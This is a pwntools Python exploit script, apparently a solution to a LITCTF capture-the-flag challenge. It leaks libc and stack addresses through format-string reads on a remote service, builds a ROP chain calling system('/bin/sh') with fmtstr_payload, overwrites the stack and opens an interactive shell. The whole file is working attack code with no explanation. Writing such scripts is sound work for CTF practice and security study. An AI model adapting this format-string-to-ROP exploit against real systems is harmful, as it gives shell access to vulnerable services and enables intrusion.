#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './main_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc litctf.org 31772'.split()


libc = ELF('./libc-2.24.so')
ld = ELF('./ld-2.24.so')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


def extract_leak(recv):
    '''Extract the leaked address from the received data.'''
    try:
        leak = list(map(lambda x: int(x,16), recv.split(b'|')[1:]))
        return leak
    except (IndexError, ValueError):
        log.error("Failed to extract leak from: {}".format(recv))
        return None
    

def addrx(func, x):
    '''Show func in hex'''
    log.info(f'{func}: {x}')


gdbscript = '''
b *(main+84)
continue
'''.format(**locals())

p = start()

# leak libc
p.sendline(b'%76$p')
libc_leak = eval(p.recvline()) + 224
log.info(f'libc_leak: {hex(libc_leak)}')

libc.address = libc_leak - (libc.sym.__elf_set___libc_subfreeres_element_hst_map_free__)
log.info(f'libc: {hex(libc.address)}')
rop = ROP(libc)

# leak stack
p.sendline(b'%14$p')
stack = eval(p.recvline()) - 0x7c
log.info(f'stack: {hex(stack)}')

ret = rop.find_gadget(["ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
binsh = next(libc.search(b'/bin/sh\0'))

#overwrite stack
payload = fmtstr_payload(8, {
    stack: pop_rdi,
    stack+8: binsh,
    stack+16: libc.sym.system,
    }, write_size='byte')
p.sendline(payload)

p.interactive()
